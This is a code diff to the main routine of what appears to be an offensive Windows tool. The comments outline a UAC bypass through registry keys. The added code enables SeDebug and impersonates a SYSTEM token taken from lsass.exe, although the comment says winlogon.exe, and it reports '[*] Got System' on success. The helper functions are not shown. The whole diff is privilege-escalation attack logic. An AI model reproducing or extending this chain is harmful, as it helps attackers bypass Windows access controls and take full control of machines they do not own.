@@ -1,6 +1,7 @@
 #include <iostream>
 #include "bpuac.h"
 #include "checkPrivs.h"
+#include "idAcq.h"
 #include "impToken.h"
 
 int main() {
@@ -12,11 +13,24 @@ int main() {
      * 2a.  Call bypass, creating the requisite reg keys and process open function
      * 2b.  return to main where it will then check if it's elevated
      * 3.   if the program is elevated it call impToken, changing to a SEDebug token
-     * 4.   return to here
+     * 4.   Program will attempt to impersonate a system token via winlogon.exe
+     * 5.   return to here
      *
      */
     if (core::isElevated()) {
-        core::it();
+        if (!core::getSEDebug()) {
+            std::cout << "[!] Failed to enable SeDebug\n";
+            return 0;
+        }
+
+        if (core::getSystemPrivs(L"lsass.exe") && core::IsSystem()) {
+            std::cout << "[*] Got System\n";
+        } else {
+            std::cout << "[!] Failed to get System\n";
+            return 0;
+        }
+
+        std::cout << "[[fin]]\n";
         std::cin.get();
     } else {
         core::bypass();
